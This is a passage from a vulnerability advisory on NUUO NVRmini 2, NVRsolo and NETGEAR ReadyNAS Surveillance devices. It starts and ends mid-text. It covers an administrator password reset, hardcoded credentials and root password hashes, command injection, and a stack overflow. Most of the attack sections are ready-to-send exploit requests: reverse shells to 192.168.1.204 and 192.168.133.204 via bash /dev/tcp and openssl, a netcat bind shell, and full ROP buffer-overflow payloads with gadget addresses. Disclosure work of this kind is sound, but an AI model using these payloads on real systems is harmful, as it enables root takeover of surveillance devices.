192.168.1.204, port 9000, running as root.  - Crystal: GET /handle_daylightsaving.php?act=update&NTPServer=bla%3bbash+-i+>%26+/dev/tcp/192.168.1.204/4444+0>%26 Connects a shell to 192.168.1.204, port 4444, running as root.   #3 Vulnerability: Administrator password reset CVE-2016-5676 Attack Vector: Remote Constraints: None, can be exploited by an unauthenticated attacker Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication) - NUUO NVRsolo, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication) - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  On older versions of the firmware and in the ReadyNAS Surveillance application unauthenticated users can call the cgi_system binary from the web interface. This binary performs a number of sensitive system commands, such as the loading of the default configuration that resets the administrator password. It seems that at least versions 2.2.1 and 3.0.0 of the NVRmini 2 and NVRsolo firmware are not affected, so this vulnerability was fixed either on these or earlier versions, but ReadyNAS Surveillance is still vulnerable.  Proof of concept: GET /cgi-bin/cgi_system?cmd=loaddefconfig  This will reset the admin password of the web interface to admin or password (depending on the firmware version) on all affected devices.   #4 Vulnerability: Information disclosure (system processes, available memory and filesystem status) CVE-2016-5677 Attack Vector: Remote Constraints: None, can be exploited by an unauthenticated attacker Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected) - NUUO NVRsolo, firmware v1.0.0 to 3.0.0 - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  The web interface contains a hidden page (__nvr_status___.php) with a hardcoded username and password that lists the current system processes, available memory and filesystem status. This information can be obtained by an unauthenticated user by performing the following request: POST /__nvr_status___.php HTTP/1.1 username=nuuoeng&password=qwe23622260&submit=Submit   #5  Vulnerability: Harcoded root password  CVE-2016-5678 Affected products / versions: - NUUO NVRmini 2, firmware v1.0.0 to 3.0.0  - NUUO NVRsolo, firmware v1.0.0 to 3.0.0  The NVRmini 2 and NVRsolo contain two hardcoded root passwords (one is commented). These passwords have not been cracked, but they are present in the firmware images which are deployed to all NVRmini 2 / NVRsolo devices.  NVRmini 2:   #root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::   root:$1$vd3TecoS$VyBh4/IsumZkqFU.1wfrV.:14461:0:99999:7:::  NVRsolo:   #root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::   root:$1$72ZFYrXC$aDYHvkWBGcRRgCrpSCpiw1:0:0:99999:7:::     #6  Vulnerability: Command injection in cgi_main transfer license command CVE-2016-5679 Attack Vector: Local / Remote Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user Affected products / versions: - NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected) - ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)  The transfer_license command has a command injection vulnerability in the ""sn"" parameter: cgi_main?cmd=transfer_license&method=offline&sn="";<command>;#  Sample exploit for NVRmini2 (open bind shell on port 4444): GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=""%3bnc+-l+-p+4444+-e+/bin/sh+%26+%23  NETGEAR Surveillance doesn't have netcat, but we can get an openssl reverse shell to 192.168.133.204:4444 instead: GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=""%3bmkfifo+/tmp/s%3b+/bin/bash+-i+<+/tmp/s+2>%261+|+openssl+s_client+-quiet+-connect+192.168.133.204%3a4444+>+/tmp/s%3b+rm+/tmp/s%3b%23  > Local exploitation: This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command: CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>' The cgi_main binary is located at ""/apps/surveillance/bin/cgi_main"" on the ReadyNAS and ""/NUUO/bin/cgi_main"" on the NVRmini2.               #7  Vulnerability: Stack buffer overflow in cgi_main transfer license command CVE-2016-5680 Attack Vector: Local / Remote Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user - NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected) - ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)  The ""sn"" parameter in transfer_license cgi_main method not only has a command injection vulnerability, but also a stack buffer overflow. Below is the pseudocode of the affected function - as it can be seen in the sprintf line, the ""sn"" parameter is copied directly into a string with a fixed length of 128 characters.  Function 0x20BC9C (NVRmini2 firmware v3.0.0):       method = getval(""method"");       sn = getval(""sn"");       (...)       memset(&command, 0, 128);       sprintf(&command, ""logger -p local0.info -t 'system' \""Activate license: %s\"""", sn);       system(&command);  > For example if the following request is performed: GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  > A core file is generated: Core was generated by `/NUUO/bin/cgi_main'. Program terminated with signal SIGSEGV, Segmentation fault. #0  0x61616160 in ?? () (gdb) i r r0             0x0	0 r1             0x0	0 r2             0x407aa4d0	1081779408 r3             0x407aa9e0	1081780704 r4             0x61616161	1633771873 r5             0x61616161	1633771873 r6             0x61616161	1633771873 r7             0x61616161	1633771873 r8             0x331fc8	3350472 r9             0x1	1 r10            0x33db54	3398484 r11            0x0	0 r12            0x1	1 sp             0xbedce528	0xbedce528 lr             0x61616161	1633771873 pc             0x61616160	0x61616160 cpsr           0x60000030	1610612784 (gdb)   The request can be sent by an HTTP GET or POST method.  > A few registers can be controlled with the sn parameter, as it can be seen in the diagram below for the NVRmini2: sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4444555566667777PPPPaaaaaaaaaaaaSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS  aaaa: filler PPPP: pc / lr register content, offset 976 4444: r4 register content, offset 962 5555: r5 register content, offset 966 6666: r6 register content, offset 970 7777: r7 register content, offset 974 SSSS: start of stack pointer, offset 992  > On the ReadyNAS Surveillance one additional register (r8) can be controlled: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa44445555666677778888PPPPaaaaaaaaaaaaSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS  aaaa: filler PPPP: pc / lr register content, offset 986 4444: r4 register content, offset 968 5555: r5 register content, offset 970 6666: r6 register content, offset 974 7777: r7 register content, offset 978 8888: r8 register content, offset 982 SSSS: start of stack pointer, offset 1002  > Exploit mitigations and constraints The table below shows the exploit mitigation technologies for each target:          NVRmini2   ReadyNAS NX          Y          Y RELRO    Partial    Partial ASLR        N          Y  An additional constraint to keep in mind is that there can be no null bytes in the exploit as the vulnerability is in the sprintf copy operation (which uses a null byte as the string terminator).  > Exploitation in the NVRmini2 (firmware v3.0.0): This example exploit creates a root bind shell on port 4444 using ROP gadgets to bypass NX. The gadgets were taken from libc-2.15.so, which is always loaded at 4066c000 in firmware 3.0.0.  0x00018ba0 : pop {r3, lr} ; bx lr -> located at 40684BA0 (first gadget, sets up r3 for the next gadget) 0x000f17cc : mov r0, sp ; blx r3 -> located at 4075D7CC (second gadget, set up args for system) 0x00039ffc : system() -> located at 406A5FFC (takes the argument from r0 - pointing to sp - and executes it) Payload (in the stack) -> %6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26 (""nc -l -p 4444 -e /bin/sh &"")  Illustration: sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{first_gadget}aaaaaaaaaaaa{system()_address}{second_gadget}{stack}  Exploit for NVRmini2 firmware v3.0.0 (""sn"" parameter value): sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%a0%4b%68%40aaaaaaaaaaaa%fc%5f%6a%40%cc%d7%75%40%6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26  Other firmware versions will have different gadget addresses. On version 3.0.0 it should work without any modification.  > Exploitation on ReadyNAS Surveillance (version v1.1.2): To develop this example exploit libcrypto.so.0.9.8 was used. The library is loaded at B6xxx000, where xxx are 4096 possible values for the memory address, as the ReadyNAS has a weak form of ASLR. For this exploit, B6CCE000 was chosen as the target base address (this was chosen randomly from a sample of collected base addresses).  The exploit connects a reverse shell to 192.168.133.204:4444 using OpenSSL. The following ROP gadgets were used: 0x000b3d9c : mov r1, sp ; mov r2, ip ; blx r6 -> located at B6D81D9C (first gadget, gets the location of the stack pointer sp, where the shellcode is located, in r1) 0x00008690 : movs r0, r1 ; movs r0, r0 ; movs r2, r2 ; movs r2, r1 ; bx r7 -> located at B6CD6691 as this is a THUMB mode gadget (second gadget, sets up the arguments to system(), putting them into r0) 0xb6ef91bc: fixed system() address when B6CCE000 is chosen as the base address of libcrypto.so.0.9.8 (takes the argument from r0 - pointing to sp - and executes it) Payload: (in the stack) -> %6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26 (""mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.133.204:4444 > /tmp/s; rm /tmp/s &"")  Illustration: sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{second_gadget}{system_address}aaaa{first_gadget}aaaaaaaaaaaa{payload}  Exploit for ReadyNAS Surveillance v1.1.2 (""sn"" parameter value): sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%91%66%cd%b6%bc%91%ef%b6aaaa%9c%1d%d8%b6aaaaaaaaaaaa%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e